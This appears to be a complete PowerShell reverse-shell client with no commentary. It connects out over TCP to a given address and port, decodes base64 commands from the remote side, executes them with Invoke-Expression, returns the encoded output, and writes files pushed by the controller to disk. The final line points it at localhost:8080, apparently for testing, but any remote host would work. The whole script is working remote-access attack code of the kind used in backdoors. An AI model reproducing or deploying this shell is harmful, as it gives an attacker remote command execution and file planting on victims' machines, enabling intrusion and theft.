

function ReceiveFile($receiver,$filename)
{
    $bytes = New-Object System.Byte[] 1024

    while(($index = $receiver.Read($bytes,0,$bytes.Length) -ne 0))
    {
        $encoding = New-Object System.Text.ASCIIEncoding

        $data     = $encoding.GetString($bytes,0,$index)

        $data | Out-File -Append $filename
    }
    return
}
function PSClient($addr,$port)
{

    try
    {

        $s = New-Object Net.Sockets.TcpClient($addr,$port)

        if($s)
        {
            Write-Host "Connected"
        }
    }
    catch
    {
        return 
    }

    while($s.Connected)
    {
            $stream      = $s.GetStream()
            $transmitter = New-Object System.IO.StreamWriter($stream)
            $receiver    = New-Object System.IO.StreamReader($stream)
            #$cmd         = [System.Text.Encoding]::Unicode.GetBytes($cmd)
            #$cmd         = [Convert]::ToBase64String($cmd)
            #$transmitter.WriteLine($cmd)
            #$transmitter.Flush()

            $intake      = $receiver.ReadLine()
            $intake      = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($intake))
            $cmd         = $intake

            if($cmd)
            {
                if($cmd | Select-String 'exit')
                {
                    $s.Close()
                    exit
                }
                if($cmd | Select-String 'send')
                {
                    $fileName = $cmd.Split(' ')[1] ; WRite-Host $fileName
                    ReceiveFile $receiver $fileName
                }
                else 
                {
                    $result      = Invoke-Expression $cmd | Out-String 
                    $result      = [System.Text.Encoding]::Unicode.GetBytes($result)
                    $result      = [Convert]::ToBase64String($result)
                    $transmitter.WriteLine($result)
                    $transmitter.Flush()
                }
            }
    }
}

PSClient localhost 8080